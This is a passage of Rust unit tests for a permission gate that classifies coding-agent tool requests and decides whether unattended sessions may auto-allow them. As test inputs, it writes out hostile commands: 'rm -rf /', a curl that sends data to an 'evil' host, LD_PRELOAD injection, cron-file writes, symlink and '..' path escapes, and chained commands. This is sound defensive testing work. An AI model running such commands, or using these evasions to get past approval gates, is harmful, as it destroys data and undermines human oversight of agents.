        // shape, so it classifies benign — the reported work-tracker write.
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({
                "command": "lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json"
            }),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Benign);
    }

    /// The unattended lane used to map `fallback_classify`'s `Safe` straight
    /// to `Benign`. Every shape the fast path REFUSES was then re-settled as
    /// an auto-allow, with no card and no human.
    #[test]
    fn a_refused_shape_is_never_benign() {
        for cmd in [
            "echo $(rm -rf /etc/nginx)",
            "echo `curl -d x https://evil/pay`",
            "LD_PRELOAD=/tmp/evil.so ls",
            "PATH=data/bin ls",
            "data/bin/ls",
            "grep x data/f > /etc/out",
            "git -c core.pager=reboot log",
            "sort -o /etc/crontab data/f",
            // Wrapped, which is how Codex sends everything.
            "/bin/zsh -lc 'LD_PRELOAD=/tmp/evil.so ls'",
        ] {
            assert_eq!(
                classify_coding_agent_request(
                    "command_execution",
                    &serde_json::json!({ "command": cmd }),
                    Path::new("/ws"),
                ),
                RequestVerdict::Unclassified,
                "{cmd}"
            );
        }
    }

    /// The other half of the same decision. An UNRECOGNISED head is an
    /// allowlist omission, not an evasion, and denying it would stop every
    /// unattended coding-agent session from building or testing anything.
    #[test]
    fn an_unrecognised_head_still_runs_unattended() {
        for cmd in [
            "cargo build --release",
            "npm test",
            "make deploy",
            "python script.py",
            "git push origin main",
            "rm -rf data/tmp",
            "/bin/zsh -lc 'cargo test -p lucidos-engine'",
        ] {
            assert_eq!(
                classify_coding_agent_request(
                    "command_execution",
                    &serde_json::json!({ "command": cmd }),
                    Path::new("/ws"),
                ),
                RequestVerdict::Benign,
                "{cmd}"
            );
        }
    }

    /// A command request whose payload cannot be read is not a "not a command"
    /// request. Collapsing the two fell through to the benign default.
    #[test]
    fn an_unreadable_command_payload_is_never_benign() {
        for input in [
            serde_json::json!({}),
            serde_json::json!({ "command": null }),
            serde_json::json!({ "command": 42 }),
            serde_json::json!({ "command": "" }),
            serde_json::json!({ "command": "   " }),
        ] {
            assert_eq!(
                classify_coding_agent_request("command_execution", &input, Path::new("/ws")),
                RequestVerdict::Unclassified,
                "{input}"
            );
        }
    }

    #[test]
    fn classify_external_api_command_is_side_effect() {
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({"command": "curl -X POST https://example.com/api -d @data"}),
            Path::new("/ws"),
        );
        assert_eq!(
            v,
            RequestVerdict::SideEffect(SideEffectCategory::ExternalApi)
        );
    }

    #[test]
    fn classify_email_command_is_side_effect() {
        let v = classify_coding_agent_request(
            "Bash",
            &serde_json::json!({"command": "echo body | mail -s hi a@b.com"}),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::SideEffect(SideEffectCategory::Email));
    }

    #[test]
    fn classify_catastrophic_command_denied() {
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({"command": "rm -rf /"}),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Catastrophic);
    }

    #[test]
    fn classify_in_workspace_file_write_is_benign() {
        let v = classify_coding_agent_request(
            "file_change",
            &serde_json::json!({"grant_root": "/ws/data/artifacts"}),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Benign);
    }

    #[test]
    fn classify_out_of_workspace_file_write_is_side_effect() {
        let v = classify_coding_agent_request(
            "Write",
            &serde_json::json!({"file_path": "/etc/cron.d/evil"}),
            Path::new("/ws"),
        );
        assert_eq!(
            v,
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
        );
    }

    #[test]
    fn classify_relative_dotdot_file_write_is_side_effect() {
        // A relative target that escapes the worktree via `..` must NOT slip
        // through as benign — it's grant-gated out-of-workspace destruction.
        let v = classify_coding_agent_request(
            "Edit",
            &serde_json::json!({"file_path": "../../etc/cron.d/evil"}),
            Path::new("/ws"),
        );
        assert_eq!(
            v,
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
        );
    }

    #[test]
    fn classify_unknown_tool_is_benign() {
        let v = classify_coding_agent_request(
            "Read",
            &serde_json::json!({"file_path": "/etc/passwd"}),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Benign);
    }

    #[test]
    fn unwrap_shell_command_cases() {
        // The realistic Codex shape.
        assert_eq!(
            unwrap_shell_command("/bin/zsh -lc 'curl -X POST https://x -d @y'"),
            "curl -X POST https://x -d @y"
        );
        assert_eq!(unwrap_shell_command("bash -c \"rm -rf /\""), "rm -rf /");
        // `sh -c <script> [$0 [arg ...]]`: operands after the script only set $0
        // and the positional params, so the script is still what runs. Cutting
        // at the matching close quote (not just unwrapping when the quotes wrap
        // the whole remainder) is what keeps this from classifying as `'rm`.
        assert_eq!(
            unwrap_shell_command("bash -c 'rm -rf /' ignored"),
            "rm -rf /"
        );
        assert_eq!(
            unwrap_shell_command("/bin/zsh -lc 'curl -X POST https://x' zsh arg1"),
            "curl -X POST https://x"
        );
        // Unterminated quote: the word scanner reads to the end of input, so
        // the scans see `rm` rather than the quoted token `'rm`. More
        // scanning, never less.
        assert_eq!(unwrap_shell_command("bash -c 'rm -rf"), "rm -rf");
        // Not a shell wrapper → unchanged (Claude Code's raw Bash command).
        assert_eq!(
            unwrap_shell_command("curl -X POST https://x"),
            "curl -X POST https://x"
        );
        // Shell with no -c flag → unchanged.
        assert_eq!(unwrap_shell_command("zsh script.sh"), "zsh script.sh");
    }

    #[test]
    fn classify_zsh_wrapped_side_effect_is_detected() {
        // Codex wraps everything in `/bin/zsh -lc '…'`; the inner side-effect
        // must still be seen (otherwise the grant check is bypassed).
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
            Path::new("/ws"),
        );
        assert_eq!(
            v,
            RequestVerdict::SideEffect(SideEffectCategory::ExternalApi)
        );
    }

    #[test]
    fn classify_zsh_wrapped_benign_is_benign() {
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({
                "command": "/bin/zsh -lc 'lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json'"
            }),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Benign);
    }

    #[test]
    fn classify_zsh_wrapped_catastrophic_is_catastrophic() {
        let v = classify_coding_agent_request(
            "command_execution",
            &serde_json::json!({"command": "/bin/zsh -lc 'rm -rf /'"}),
            Path::new("/ws"),
        );
        assert_eq!(v, RequestVerdict::Catastrophic);
    }

    // --- in-worktree write fast path (pure, but real paths on disk) ---------

    /// A worktree-shaped fixture: `<tmp>/wt` holding `.claude/rules/`, `.git/`,
    /// a `vendor/dep/.git/` nested repo, plus a sibling `<tmp>/outside` and a
    /// symlink `<tmp>/wt/escape` pointing at it. Containment is resolved
    /// against the real filesystem, so these have to exist.
    struct WorktreeFixture {
        _tmp: tempfile::TempDir,
        root: std::path::PathBuf,
        outside: std::path::PathBuf,
    }

    fn worktree_fixture() -> WorktreeFixture {
        let tmp = tempfile::tempdir().expect("tempdir");
        let root = tmp.path().join("wt");
        let outside = tmp.path().join("outside");
        for dir in [
            root.join(".claude/rules"),
            root.join(".git/hooks"),
            root.join("vendor/dep/.git"),
            root.join("crates/lucidos-engine/src"),
            outside.join(".claude"),
        ] {
            std::fs::create_dir_all(&dir).expect("create fixture dir");
        }
        std::fs::write(root.join(".gitignore"), "target\n").expect("write .gitignore");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, root.join("escape")).expect("symlink");
        WorktreeFixture {
            _tmp: tmp,
            root,
            outside,
        }
    }

    /// Render an absolute path under the fixture root as a `&str`-able String.
    fn under(root: &Path, rel: &str) -> String {
        root.join(rel).to_string_lossy().into_owned()
    }

    #[test]
    fn path_inside_worktree_accepts_targets_under_the_root() {
        let f = worktree_fixture();
        assert!(path_inside_worktree(
            &under(&f.root, ".claude/rules/frontend.md"),
            &f.root
        ));
        // A file that doesn't exist yet (a `Write`) — resolution walks up to
        // the nearest existing ancestor.
        assert!(path_inside_worktree(
            &under(&f.root, "crates/lucidos-engine/src/brand_new.rs"),
            &f.root
        ));
        // A directory that doesn't exist yet either.
        assert!(path_inside_worktree(
            &under(&f.root, ".claude/skills/run-tests/SKILL.md"),
            &f.root
        ));
    }

    #[test]
    fn path_inside_worktree_rejects_targets_outside_the_root() {
        let f = worktree_fixture();
        // The real out-of-worktree case from the event stream: the user's
        // global CC config. Must keep rendering a card.
        assert!(!path_inside_worktree(
            &under(&f.outside, ".claude/settings.json"),
            &f.root
        ));
        assert!(!path_inside_worktree("/etc/cron.d/evil", &f.root));
    }

    /// The escape a purely lexical prefix check would have allowed: a symlink
    /// inside the worktree pointing at an external directory. The write lands
    /// outside and never shows up in the reviewed diff, so it must still ask.
    #[cfg(unix)]
    #[test]
    fn path_inside_worktree_rejects_symlink_escapes() {
        let f = worktree_fixture();
        // Through the symlinked directory, into an existing external dir…
        assert!(!path_inside_worktree(
            &under(&f.root, "escape/.claude/settings.json"),
            &f.root
        ));
        // …and to a file that doesn't exist yet beyond it (the `Write` case,
        // where resolution has to walk up through the symlink).
        assert!(!path_inside_worktree(
            &under(&f.root, "escape/.claude/brand_new.json"),
            &f.root
        ));
    }

    /// A symlink pointing INTO the worktree's own git metadata must be caught
    /// by the post-resolution `.git` check, not just the lexical one.
    #[cfg(unix)]
    #[test]
    fn path_inside_worktree_rejects_symlink_into_git_metadata() {
        let f = worktree_fixture();
        std::os::unix::fs::symlink(f.root.join(".git"), f.root.join("gitlink"))
            .expect("symlink into .git");
        assert!(!path_inside_worktree(
            &under(&f.root, "gitlink/hooks/pre-commit"),
            &f.root
        ));
    }

    #[test]
    fn path_inside_worktree_rejects_prefix_sibling_of_the_root() {
        let f = worktree_fixture();
        let sibling = f.root.with_file_name("wt-sibling");
        std::fs::create_dir_all(sibling.join("src")).expect("create sibling");
        assert!(!path_inside_worktree(
            &sibling.join("src/main.rs").to_string_lossy(),
            &f.root
        ));
    }

    #[test]
    fn path_inside_worktree_rejects_parent_dir_escapes() {
        let f = worktree_fixture();
        assert!(!path_inside_worktree("../../etc/cron.d/evil", &f.root));
        assert!(!path_inside_worktree(
            &under(&f.root, "../outside/.claude/settings.json"),
            &f.root
        ));
    }

    #[test]
    fn path_inside_worktree_rejects_relative_paths() {
        // Resolving a relative path needs the agent's cwd, which differs
        // between repo-rooted and app threads. It fails closed rather than
        // guessing the worktree root.
        let f = worktree_fixture();
        assert!(!path_inside_worktree(".claude/rules/frontend.md", &f.root));
    }

    #[test]
    fn path_inside_worktree_rejects_git_metadata_at_any_depth() {
        // Git metadata is the one in-worktree location that does NOT show up
        // in the diff the user reviews before Apply, so it keeps its card.
        let f = worktree_fixture();
        assert!(!path_inside_worktree(
            &under(&f.root, ".git/hooks/pre-commit"),
            &f.root
        ));
        assert!(!path_inside_worktree(
            &under(&f.root, "vendor/dep/.git/config"),
            &f.root
        ));
        // A file merely NAMED like it is fine — the check is component-wise.
        assert!(path_inside_worktree(&under(&f.root, ".gitignore"), &f.root));
    }

    #[test]
    fn path_inside_worktree_fails_closed_on_an_unresolvable_root() {
        // A worktree that has been removed (stale session entry) can't prove
        // containment of anything.
        let f = worktree_fixture();
        let gone = f.root.join("never-existed");
        assert!(!path_inside_worktree(
            &under(&f.root, ".claude/rules/frontend.md"),
            &gone
        ));
    }

    #[test]
    fn worktree_write_auto_allowed_covers_the_file_write_tools() {
        let f = worktree_fixture();
        for tool in ["Edit", "Write", "MultiEdit", "NotebookEdit"] {
            let key = if tool == "NotebookEdit" {
                "notebook_path"
            } else {
                "file_path"
            };
            let input = serde_json::json!({ key: under(&f.root, ".claude/rules/db.md") });
            assert!(
                worktree_write_auto_allowed(tool, &input, Some(&f.root)),
                "{tool} on an in-worktree .claude/ path must skip the card"
            );
        }
    }

    #[test]
    fn worktree_write_auto_allowed_ignores_commands() {
        // A command can do anything — it stays on the card path even when it
        // only mentions a `.claude/` file.
        let f = worktree_fixture();
        for tool in ["Bash", "command_execution"] {
            let input = serde_json::json!({
                "command": format!("rm -rf {}", under(&f.root, ".claude/rules"))
            });
            assert!(
                !worktree_write_auto_allowed(tool, &input, Some(&f.root)),
                "{tool} must never take the worktree fast path"
            );
        }
    }

    #[test]
    fn worktree_write_auto_allowed_fails_closed_without_a_known_worktree() {
        let input = serde_json::json!({ "file_path": "/anything/x.md" });
        assert!(
            !worktree_write_auto_allowed("Edit", &input, None),
            "an unknown worktree root must render the card"
        );
    }

    #[test]
    fn worktree_write_auto_allowed_rejects_out_of_worktree_and_git_targets() {
        let f = worktree_fixture();
        assert!(!worktree_write_auto_allowed(
            "Edit",
            &serde_json::json!({ "file_path": under(&f.outside, ".claude/settings.json") }),
            Some(&f.root)
        ));
        assert!(!worktree_write_auto_allowed(
            "Write",
            &serde_json::json!({ "file_path": under(&f.root, ".git/hooks/pre-commit") }),
            Some(&f.root)
        ));
    }

    /// A Codex `file_change` input as it reaches the engine: the approval's own
    /// `item_id`, plus the `changes` list the app-server driver attached from the
    /// item's `item/started`.
    fn file_change_input(paths: &[&str]) -> serde_json::Value {
        serde_json::json!({
            "item_id": "exec-1",
            "changes": paths.iter()
                .map(|p| serde_json::json!({ "path": p, "kind": {"type": "add"} }))
                .collect::<Vec<_>>(),
        })
    }

    #[test]
    fn worktree_write_auto_allowed_requires_every_codex_target_inside() {
        // A `changes` list is one approval over several files, so the card can only
        // be skipped when the whole patch lands in the reviewed diff.
        let f = worktree_fixture();
        let inside_a = under(&f.root, "src/a.rs");
        let inside_b = under(&f.root, ".claude/rules/db.md");
        let outside = under(&f.outside, "notes.txt");
        assert!(worktree_write_auto_allowed(
            "file_change",
            &file_change_input(&[&inside_a, &inside_b]),
            Some(&f.root)
        ));
        assert!(
            !worktree_write_auto_allowed(
                "file_change",
                &file_change_input(&[&inside_a, &outside]),
                Some(&f.root)
            ),
            "one unplaceable path in the set is enough to ask"
        );
    }

    /// A `changes` list codex only partly described: one path we can read, one we
    /// cannot. The driver writes an omitted path through `str_field`, which
    /// yields `""`, so this is the shape that actually arrives.
    fn partly_readable_change_set(readable: &str) -> serde_json::Value {
        serde_json::json!({
            "item_id": "exec-1",
            "changes": [
                { "path": readable, "kind": {"type": "add"} },
                { "path": "", "kind": {"type": "add"} },
            ],
        })
    }

    #[test]
    fn one_unreadable_change_entry_makes_the_whole_set_unresolved() {
        // The dangerous shape. Filtering the unreadable entry out would let
        // the readable sibling vouch for it. An in-worktree path would then
        // skip the card for a patch whose other half writes somewhere unseen.
        let f = worktree_fixture();
        let inside = under(&f.root, "src/a.rs");
        assert!(
            !worktree_write_auto_allowed(
                "file_change",
                &partly_readable_change_set(&inside),
                Some(&f.root)
            ),
            "a half-understood patch must still render a card"
        );
        assert_eq!(
            classify_coding_agent_request(
                "file_change",
                &partly_readable_change_set("/ws/src/a.rs"),
                Path::new("/ws")
            ),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
        );
        assert_eq!(
            build_permission_summary("file_change", &partly_readable_change_set("/ws/src/a.rs")),
            "file_change",
            "naming only the half that parsed would read as a complete card"
        );
    }

    #[test]
    fn a_stray_changes_key_never_speaks_for_a_claude_code_file_write() {
        // `changes` is Codex vocabulary. CC's input is model-authored JSON
        // the permission server forwards verbatim, so an extra key can arrive.
        // Reading it would REPLACE the real `file_path` and let one in-worktree
        // entry skip the card for a write landing anywhere.
        let f = worktree_fixture();
        let input = serde_json::json!({
            "file_path": under(&f.outside, "hosts"),
            "changes": [{ "path": under(&f.root, "ok.txt") }],
        });
        assert!(
            !worktree_write_auto_allowed("Write", &input, Some(&f.root)),
            "the card must be decided by file_path, not by a stray changes key"
        );
        assert_eq!(
            classify_coding_agent_request("Write", &input, Path::new("/ws")),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
        );
    }

    #[test]
    fn a_relative_change_path_is_unresolved_rather_than_assumed_in_workspace() {
        // `path_outside_workspace` reads an unplaceable path as in-workspace,
        // which is right for CC (its file tools require an absolute path) and
        // inverted for a `file_change`: codex raises that approval BECAUSE the
        // patch escaped its sandbox, so "assume it lands in the worktree" is
        // the one conclusion its existence rules out.
        let input = serde_json::json!({ "changes": [{ "path": "src/x.rs" }] });
        assert_eq!(
            classify_coding_agent_request("file_change", &input, Path::new("/ws")),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
        );
        // CC's own relative-path handling is untouched.
        assert_eq!(
            classify_coding_agent_request(
                "Write",
                &serde_json::json!({ "file_path": "src/x.rs" }),
                Path::new("/ws")
            ),
            RequestVerdict::Benign,
        );
    }

    #[test]
    fn a_change_set_of_an_unknown_shape_is_not_classified_from_grant_root() {
        // `changes` present but not a list is a shape we did not understand.
        // The security decision must not fall through to `grant_root` and treat
        // that directory as the request's one known target.
        let input = serde_json::json!({ "changes": "surprise", "grant_root": "/ws/sub" });
        assert_eq!(
            classify_coding_agent_request("file_change", &input, Path::new("/ws")),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
            "an in-workspace grant_root must not make an unreadable `changes` list benign"
        );
        // The SUMMARY may still surface it. `grant_root` is a documented
        // last-resort key, and reaching it through the key scan makes no claim
        // that it is a file being edited. What must never happen is it arriving
        // through the change-set branch, which prints the files.
        assert_eq!(
            build_permission_summary("file_change", &input),
            "file_change /ws/sub"
        );
    }

    #[test]
    fn worktree_write_auto_allowed_rejects_an_empty_target_set() {
        // The shape codex actually sends when the item was never announced:
        // nothing to place, so nothing to auto-allow.
        let f = worktree_fixture();
        for input in [
            serde_json::json!({ "item_id": "exec-1" }),
            serde_json::json!({ "item_id": "exec-1", "changes": [] }),
        ] {
            assert!(!worktree_write_auto_allowed(
                "file_change",
                &input,
                Some(&f.root)
            ));
        }
    }

    #[test]
    fn classify_flags_a_codex_change_set_touching_anything_outside() {
        let ws = Path::new("/ws");
        assert_eq!(
            classify_coding_agent_request(
                "file_change",
                &file_change_input(&["/ws/src/a.rs", "/ws/data/b.md"]),
                ws
            ),
            RequestVerdict::Benign
        );
        assert_eq!(
            classify_coding_agent_request(
                "file_change",
                &file_change_input(&["/ws/src/a.rs", "/etc/cron.d/evil"]),
                ws
            ),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
            "one out-of-workspace path grant-gates the whole patch"
        );
    }

    #[test]
    fn classify_grant_gates_a_codex_change_whose_paths_are_unknown() {
        // Codex raises a file-change approval because the patch escaped its
        // sandbox. Without the `changes` list, the only path key is
        // `grant_root`, and it arrives null. The request would then classify as
        // Benign and an unattended session would auto-allow it.
        assert_eq!(
            classify_coding_agent_request(
                "file_change",
                &serde_json::json!({ "item_id": "exec-1" }),
                Path::new("/ws")
            ),
            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
        );
    }

    #[test]
    fn path_outside_workspace_cases() {
        let ws = Path::new("/ws");
        assert!(!path_outside_workspace("/ws/data/x", ws));
        assert!(!path_outside_workspace("relative/path", ws)); // relative, no .. → inside
        assert!(path_outside_workspace("/etc/passwd", ws));
        assert!(path_outside_workspace("/ws/../etc", ws)); // absolute .. → outside
                                                           // Relative `..` escapes the worktree too, so it must be caught (the gate is
                                                           // checked before the relative-is-inside shortcut).
        assert!(path_outside_workspace("../../etc/cron.d/evil", ws));
    }

    /// The same symlink escape `path_inside_worktree` resolves for. A link
    /// inside the workspace pointing outside passes a purely lexical prefix
    /// check, so the write lands outside and the unattended lane auto-allows
    /// it.
    #[test]
    #[cfg(unix)]
    fn path_outside_workspace_rejects_a_symlink_escape() {
        let f = worktree_fixture();
        // Through the symlink, both to an existing target and to a new file
        // under it (where resolution walks up through the link).
        assert!(path_outside_workspace(
            &under(&f.root, "escape/.claude/settings.json"),
            &f.root
        ));
        assert!(path_outside_workspace(
            &under(&f.root, "escape/not-created-yet.txt"),
            &f.root
        ));
        assert!(path_outside_workspace(
            &f.outside.join("x").to_string_lossy(),
            &f.root
        ));
        // A genuine in-workspace target stays inside, including one that does
        // not exist yet.
        assert!(!path_outside_workspace(
            &under(&f.root, ".claude/rules/frontend.md"),
            &f.root
        ));
        assert!(!path_outside_workspace(
            &under(&f.root, "crates/lucidos-engine/src/brand_new.rs"),
            &f.root
        ));
    }

    // --- decision matrix (pure, no DB) -------------------------------------

    #[test]
    fn decide_benign_allows_with_empty_grant() {
        let (allowed, _) = decide_unattended(RequestVerdict::Benign, &[]);
        assert!(allowed);
    }

    #[test]
    fn decide_unclassified_denies_whatever_the_grant() {
        for grant in [
            &[][..],
            &[SideEffectCategory::Other],
            &[SideEffectCategory::ExternalApi, SideEffectCategory::Email],
        ] {
            let (allowed, reason) = decide_unattended(RequestVerdict::Unclassified, grant);
            assert!(!allowed);
            assert_eq!(reason, UNATTENDED_DENY_UNCLASSIFIED_REASON);
        }
    }

    /// One session click must grant the command's own head, not the wrapper
    /// Codex puts in front of every command it runs.
    #[test]
    fn a_codex_session_grant_covers_one_head_not_the_whole_thread() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        let req = |cmd: &str| serde_json::json!({ "command": cmd });
        assert!(session_allow_covers(
            "command_execution",
            &req("/bin/zsh -lc 'git log --oneline'"),
            granted(&["command_execution(git:*)"])
        ));
        // The click that granted `git` must not carry a later `rm`.
        assert!(!session_allow_covers(
            "command_execution",
            &req("/bin/zsh -lc 'rm -rf /'"),
            granted(&["command_execution(git:*)"])
        ));
        // Nor a compound whose trailing segment it never named.
        assert!(!session_allow_covers(
            "command_execution",
            &req("/bin/zsh -lc 'git status && rm -rf /'"),
            granted(&["command_execution(git:*)"])
        ));
        // A code-injecting preamble is refused on the grant lane too.
        assert!(!session_allow_covers(
            "Bash",
            &req("LD_PRELOAD=/tmp/evil.so ls"),
            granted(&["Bash(ls:*)"])
        ));
        // Non-command tools keep their exact single-pattern match.
        assert!(session_allow_covers(
            "Edit",
            &serde_json::json!({ "file_path": "/tmp/foo.md" }),
            granted(&["Edit(/tmp/foo.md)"])
        ));
    }

    /// An "Always allow" click binds the session it was clicked in, because the
    /// gate reads the workspace allowlist itself. The pattern language is the
    /// one the click stored.
    #[test]
    fn a_persisted_grant_covers_the_patterns_its_click_stored() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        let cmd = |c: &str| serde_json::json!({ "command": c });

        // Broad on a command means "any command", the label fast path.
        assert!(persisted_allow_covers(
            "Bash",
            &cmd("cargo test"),
            granted(&["Bash"])
        ));
        // Narrow is head-scoped, and the head is all it carries.
        assert!(persisted_allow_covers(
            "Bash",
            &cmd("git status"),
            granted(&["Bash(git:*)"])
        ));
        assert!(!persisted_allow_covers(
            "Bash",
            &cmd("rm -rf /"),
            granted(&["Bash(git:*)"])
        ));
        // Broad on a tool with no sub-scope is the bare name.
        assert!(persisted_allow_covers(
            "Read",
            &serde_json::json!({ "file_path": "/tmp/foo.md" }),
            granted(&["Read"])
        ));
        // A Skill click can store either shape, and both must match.
        let skill = serde_json::json!({ "skill": "code-review:code-review" });
        assert!(persisted_allow_covers("Skill", &skill, granted(&["Skill"])));
        assert!(persisted_allow_covers(
            "Skill",
            &skill,
            granted(&["Skill(code-review:*)"])
        ));
        // An empty allowlist covers nothing, which is the first-run state.
        assert!(!persisted_allow_covers("Read", &skill, granted(&[])));
    }

    /// The three shapes a stored pattern must never reach, all of them the same
    /// finding: `derive_allow_pattern` returns `None` at both persisted scopes,
    /// so Claude Code would keep carding them after the respawn.
    #[test]
    fn a_persisted_grant_never_reaches_what_claude_code_ignores() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        let cmd = |c: &str| serde_json::json!({ "command": c });

        // A bare line for a tool CC routes through the prompt regardless.
        for tool in ["Edit", "Write", "NotebookEdit", "ExitPlanMode"] {
            assert!(
                !persisted_allow_covers(
                    tool,
                    &serde_json::json!({ "file_path": "/tmp/foo.md" }),
                    granted(&["Edit", "Write", "NotebookEdit", "ExitPlanMode"])
                ),
                "a bare {tool} line must not cover its own request"
            );
        }
        // A command touching a CC-protected path, under the broadest grant
        // there is. The card for it stays, and so does the one after respawn.
        for c in ["rm -rf .git/hooks", "cat .claude/settings.json"] {
            assert!(
                !persisted_allow_covers("Bash", &cmd(c), granted(&["Bash", "Bash(rm:*)"])),
                "a protected-path command must still ask: {c}"
            );
        }
        // Codex: no driver reads this file, so nothing in it may answer for one.
        assert!(!persisted_allow_covers(
            "command_execution",
            &cmd("/bin/zsh -lc 'git status'"),
            granted(&["Bash", "command_execution", "command_execution(git:*)"])
        ));
        assert!(!persisted_allow_covers(
            "file_change",
            &serde_json::json!({ "changes": [{ "path": "/tmp/x" }] }),
            granted(&["file_change"])
        ));
    }

    /// The per-segment rule the chat lane and the session lane already share.
    /// A grant names a HEAD, so it stands only for a command whose head is what
    /// runs.
    #[test]
    fn a_persisted_command_grant_covers_every_segment_or_none() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        let cmd = |c: &str| serde_json::json!({ "command": c });

        assert!(!persisted_allow_covers(
            "Bash",
            &cmd("git status && rm -rf /"),
            granted(&["Bash(git:*)"])
        ));
        // A code-injecting preamble is a refusal, not a `ls` the grant covers.
        assert!(!persisted_allow_covers(
            "Bash",
            &cmd("LD_PRELOAD=/tmp/evil.so ls"),
            granted(&["Bash(ls:*)"])
        ));
        // A command with no readable text has no head to cover.
        assert!(!persisted_allow_covers(
            "Bash",
            &serde_json::json!({}),
            granted(&["Bash(ls:*)"])
        ));
    }

    #[test]
    fn decide_catastrophic_denies_even_when_other_granted() {
        let (allowed, _) =
            decide_unattended(RequestVerdict::Catastrophic, &[SideEffectCategory::Other]);
        assert!(!allowed);
    }

    #[test]
    fn decide_side_effect_allows_only_when_granted() {
        let (allowed, reason) = decide_unattended(
            RequestVerdict::SideEffect(SideEffectCategory::Email),
            &[SideEffectCategory::Email],
        );
        assert!(allowed);
        assert_eq!(reason, UNATTENDED_ALLOW_GRANTED_REASON);

        let (denied, _) = decide_unattended(
            RequestVerdict::SideEffect(SideEffectCategory::Email),
            &[SideEffectCategory::ExternalApi],
        );
        assert!(!denied);
    }

    // --- resolver (DB-backed) ----------------------------------------------

    #[tokio::test]
    async fn resolve_attend_mode_human_device_is_interactive() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let thread_id = Uuid::new_v4();
        insert_origin_event(
            &pool,
            thread_id,
            "MessageReceived",
            &MessageOrigin::Device {
                device_id: "d1".into(),
                label: "Phone".into(),
            },
        )
        .await;
        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), thread_id).await;
        assert_eq!(mode, AttendMode::Interactive);
        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    #[tokio::test]
    async fn resolve_attend_mode_trigger_root_inherits_grant() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let trigger_id = "trig-1";
        let thread_id = Uuid::new_v4();
        insert_origin_event(
            &pool,
            thread_id,
            "TriggerStarted",
            &scheduler_origin(trigger_id),
        )
        .await;
        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::ExternalApi]);
        let mode = resolve_attend_mode(&pool, &cfgs, thread_id).await;
        assert_eq!(
            mode,
            AttendMode::Unattended {
                grant: vec![SideEffectCategory::ExternalApi]
            }
        );
        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    #[tokio::test]
    async fn resolve_attend_mode_walks_agent_subthread_to_trigger_root() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let trigger_id = "trig-2";
        let root = Uuid::new_v4();
        let child = Uuid::new_v4();
        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
        insert_child_spawn_event(&pool, child, root).await;
        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
        let mode = resolve_attend_mode(&pool, &cfgs, child).await;
        assert_eq!(
            mode,
            AttendMode::Unattended {
                grant: vec![SideEffectCategory::Email]
            }
        );
        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// A `relation: "top"` spawn stamps a `ThreadLink` origin naming its
    /// spawning thread (so the route popover can link back) but carries NO
    /// `parent_thread_id`. Attribution must not lend it the spawning thread's trigger
    /// grant: the thread was asked to run independently, so an unresolvable
    /// permission request waits for a human instead of auto-approving a
    /// real-world side effect.
    #[tokio::test]
    async fn resolve_attend_mode_top_spawn_does_not_inherit_trigger_grant() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let trigger_id = "trig-top";
        let root = Uuid::new_v4();
        let spawned = Uuid::new_v4();
        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
        // Origin without linkage: the top-spawn shape.
        insert_origin_event(&pool, spawned, "MessageReceived", &parent_link(root)).await;
        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
        let mode = resolve_attend_mode(&pool, &cfgs, spawned).await;
        assert_eq!(
            mode,
            AttendMode::Interactive,
            "a top spawn names its spawning thread for display, but is not in its privilege tree"
        );
        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    #[tokio::test]
    async fn resolve_attend_mode_human_rooted_subthread_is_interactive() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let root = Uuid::new_v4();
        let child = Uuid::new_v4();
        insert_origin_event(
            &pool,
            root,
            "MessageReceived",
            &MessageOrigin::Device {
                device_id: "d".into(),
                label: "Mac".into(),
            },
        )
        .await;
        insert_child_spawn_event(&pool, child, root).await;
        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), child).await;
        assert_eq!(mode, AttendMode::Interactive);
        pool.close().await;
        teardown_test_db(&db_name).await;
